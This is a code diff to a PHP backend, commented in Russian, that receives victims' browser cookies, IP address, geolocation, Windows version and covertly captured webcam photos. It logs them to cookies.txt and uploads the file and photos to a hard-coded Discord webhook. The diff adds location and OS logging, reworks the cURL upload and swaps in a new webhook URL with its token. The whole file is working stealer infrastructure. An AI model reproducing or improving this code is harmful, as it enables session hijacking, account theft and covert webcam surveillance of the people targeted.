@@ -8,69 +8,66 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     
     if (isset($data['cookies'])) {
         $timestamp = date('Y-m-d H:i:s');
-        $ip = $data['ip'] ?? $_SERVER['REMOTE_ADDR'];
+        $ip = $_SERVER['REMOTE_ADDR'];
         $userAgent = $_SERVER['HTTP_USER_AGENT'];
         
         $content = "=== Новые данные получены ===\n";
         $content .= "Время: " . $timestamp . "\n";
         $content .= "IP Адрес: " . $ip . "\n";
+        
+        // Добавляем информацию о местоположении
+        if (isset($data['locationInfo'])) {
+            $location = $data['locationInfo'];
+            $content .= "Страна: " . $location['emoji'] . " " . $location['country'] . "\n";
+            $content .= "Регион: " . $location['region'] . "\n";
+            $content .= "Город: " . $location['city'] . "\n";
+        }
+        
+        // Добавляем версию Windows
+        if (isset($data['windowsVersion'])) {
+            $content .= "Windows: " . $data['windowsVersion'] . "\n";
+        }
+        
         $content .= "User Agent: " . $userAgent . "\n";
         $content .= "Cookies:\n" . $data['cookies'] . "\n\n";
         
         // Сохраняем в файл
         file_put_contents('cookies.txt', $content, FILE_APPEND);
         
-        // Сохраняем фото с веб-камеры, если оно есть
-        if (isset($data['webcam']) && !empty($data['webcam'])) {
-            $imageData = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $data['webcam']));
-            $filename = 'webcam_' . time() . '.jpg';
-            file_put_contents($filename, $imageData);
+        // Сохраняем фото если оно есть
+        $photoName = null;
+        if (isset($data['webcamPhoto']) && $data['webcamPhoto']) {
+            $photoData = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $data['webcamPhoto']));
+            $photoName = 'webcam_' . time() . '.jpg';
+            file_put_contents($photoName, $photoData);
         }
         
-        // Отправляем файлы в Discord
-        $webhookUrl = 'https://discord.com/api/webhooks/1375196009419898972/gxhjvoZXT56YAmQcZNsjG7AdcvkvmtdCJ5S8JbrK9CoVToRfNdzh8vXZkSER4gQzstrr';
+        // Отправляем файл в Discord
+        $webhookUrl = 'https://discord.com/api/webhooks/1375192857568084009/LZI_jEcNrd9wx84WYcDcl5Yv5toNXRIiKowuSSoD-TKukfgq0Y0ylGx3TH2nY1T0e7vR';
         
         // Создаем CURL запрос
         $ch = curl_init();
         
-        // Создаем multipart/form-data
-        $boundary = uniqid();
-        $delimiter = '-------------' . $boundary;
-        
-        $postData = '';
-        
-        // Добавляем сообщение
-        $postData .= "--" . $delimiter . "\r\n"
-                 . 'Content-Disposition: form-data; name="content"' . "\r\n\r\n"
-                 . "Новые данные получены\r\n";
+        // Подготавливаем данные для отправки
+        $postData = array(
+            'content' => 'Новые данные получены'
+        );
         
         // Добавляем файл с куки
         if (file_exists('cookies.txt')) {
-            $postData .= "--" . $delimiter . "\r\n"
-                     . 'Content-Disposition: form-data; name="file"; filename="cookies.txt"' . "\r\n"
-                     . 'Content-Type: text/plain' . "\r\n\r\n"
-                     . file_get_contents('cookies.txt') . "\r\n";
+            $postData['file1'] = new CURLFile('cookies.txt', 'text/plain', 'cookies.txt');
         }
         
-        // Добавляем фото с веб-камеры
-        if (isset($filename) && file_exists($filename)) {
-            $postData .= "--" . $delimiter . "\r\n"
-                     . 'Content-Disposition: form-data; name="file"; filename="webcam.jpg"' . "\r\n"
-                     . 'Content-Type: image/jpeg' . "\r\n\r\n"
-                     . file_get_contents($filename) . "\r\n";
+        // Если есть фото, добавляем его
+        if ($photoName && file_exists($photoName)) {
+            $postData['file2'] = new CURLFile($photoName, 'image/jpeg', 'webcam.jpg');
         }
-        
-        $postData .= "--" . $delimiter . "--\r\n";
         
         // Настраиваем CURL
         curl_setopt($ch, CURLOPT_URL, $webhookUrl);
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, [
-            'Content-Type: multipart/form-data; boundary=' . $delimiter,
-            'Content-Length: ' . strlen($postData)
-        ]);
         
         // Отправляем запрос
         $response = curl_exec($ch);
@@ -84,9 +81,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         
         curl_close($ch);
         
-        // Удаляем временные файлы
-        if (isset($filename) && file_exists($filename)) {
-            unlink($filename);
+        // Удаляем временный файл с фото
+        if ($photoName && file_exists($photoName)) {
+            unlink($photoName);
         }
     } else {
         echo json_encode(['success' => false, 'error' => 'No cookies data']);
